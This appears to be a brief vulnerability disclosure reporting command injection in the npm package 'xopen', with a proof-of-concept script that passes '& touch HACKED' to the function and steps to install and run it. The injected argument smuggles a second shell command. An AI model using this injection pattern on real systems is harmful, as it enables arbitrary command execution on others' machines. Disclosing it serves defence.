# Description

Command Injection in xopen

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var xopen =require("xopen");
xopen("& touch HACKED");
```

2. Execute the following commands in terminal:

```
npm i xopen # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
